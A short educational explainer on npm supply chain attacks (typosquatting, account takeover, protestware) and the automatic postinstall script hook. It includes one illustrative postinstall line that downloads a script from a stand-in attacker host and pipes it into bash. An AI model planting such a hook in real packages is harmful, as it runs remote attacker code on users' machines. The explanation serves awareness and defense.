Supply Chain Attack targets a third-party vendor instead of the main target.

## What is NPM?
**Node Package Manager** - Package manager for node.js and largest software registry in the world. Run `npm install [package-name]` and NPM downloads the code created by someone else directly into your project's node_modules folder.

## Anatomy of an Attack
NPM supply chain attack usually goes down in one of the three ways:
- Typosquatting: The attacker publishes a malicious package with a name slightly off from a popular one (e.g., electorn instead of electron).
- Account Takeover: The attacker phishes or cracks the password of a legitimate package maintainer. They push a "minor update" to the real package that includes malware.
- Protestware/Rogue Maintainer: The actual creator of the package intentionally pushes destructive code to make a political statement or out of frustration.

**Key Mechanism - `postinstall`:**
NPM allows scripts (like `postinstall`) to run automatically after installation (package.json). Attackers exploit this by adding commands such as:

```json
"postinstall": "curl http://evil-server.com/payload.sh | bash"
```
This executes malicious code immediately when `npm install` is run, often with the user’s permissions—making it highly dangerous.
